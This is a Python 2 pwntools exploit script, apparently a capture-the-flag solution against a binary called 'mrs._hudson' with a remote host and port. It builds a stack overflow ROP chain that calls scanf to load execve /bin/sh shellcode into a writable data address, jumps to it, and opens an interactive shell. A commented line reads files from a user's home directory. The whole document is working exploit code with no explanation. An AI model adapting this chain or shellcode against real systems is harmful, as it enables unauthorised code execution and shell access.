#!/usr/bin/env python2
from pwn import *

HOST, PORT = "178.62.249.106 8642".split(" ")
PORT = int(PORT)

file_path = "./mrs._hudson"
# libc_path = "./libc.so.6"
# proc_args = []
#
gdb_bps = []
gdb_bps += [0x0000000000400686]
gdb_cmd = []
gdb_cmd += ["break *" + hex(x) for x in gdb_bps]
gdb_cmd += ['c']
gdb_cmd = '\n'.join(gdb_cmd)
# gdb_env = {'LD_PRELOAD': './libc.so.6'}

context.binary = file_path
context.log_level = 'debug'
context.terminal = ['konsole', '-e']

proc = process(file_path)
#proc = remote(HOST, PORT)
#proc = gdb.debug(file_path, gdb_cmd)
elf = ELF(file_path)
#libc = ELF(libc_path)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

scanf = 0x0000000000400520

exp = ""
exp += p64(0x0000000000601030) * (120/8)
exp += p64(0x4006f3) # pop rdi
exp += p64(0x000000000040072B) # argument do rdi - "%s"
exp += p64(0x00000000004006f1) # pop rsi
exp += p64(0x0000000000601030) # argument do rsi - data start
exp += p64(0xAAAAAAAAAAAAAAAA) # smieci
exp += p64(0x00000000004004ee) # nop
exp += p64(0x0000000000400680) # call i
exp += p64(0x0000000000601030) # adres shellcode

proc.sendlineafter("2000.\n", exp)
proc.sendline(p64(0x0000000000601030) + (p64(0x0000000000601040)) + shellcode)
# proc.sendline(shellcode)
proc.interactive()
#proc.sendline("cat /home/frontofficemanager/*")
print proc.recv(1024)
